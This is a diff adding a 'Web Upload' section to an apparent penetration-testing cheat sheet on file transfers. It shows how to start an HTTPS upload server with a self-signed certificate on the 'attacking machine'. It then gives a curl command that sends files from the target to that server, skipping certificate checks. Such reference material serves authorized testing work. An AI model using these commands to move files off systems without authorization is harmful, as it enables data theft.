@@ -388,6 +388,34 @@ scp <USER>@<IP>:<FILE PATH> .
 &nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h2>📥 Uploads</h2></summary>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Web Upload</h3></summary>
+
+**Attacking machine: Start Web Server**  
+```bash
+sudo python3 -m pip install --user uploadserver
+```
+
+**Attacking machine: Create a Self-Signed Certificate**  
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+
+> **_NOTE:_**  The webserver should not host the certificate. Create a new directory to host the file for the webserver.
+
+
+**Attacking machine: Start Web Server**  
+```bash
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+**Targe machine: Start Web Server**  
+```bash
+curl -X POST https://<IP>/upload -F 'files=@/<FILE>' -F 'files=@/<FILE>' --insecure
+```
+
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>SCP Uploads</h3></summary>  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
 <summary><h4>Basic SCP Upload</h4></summary>
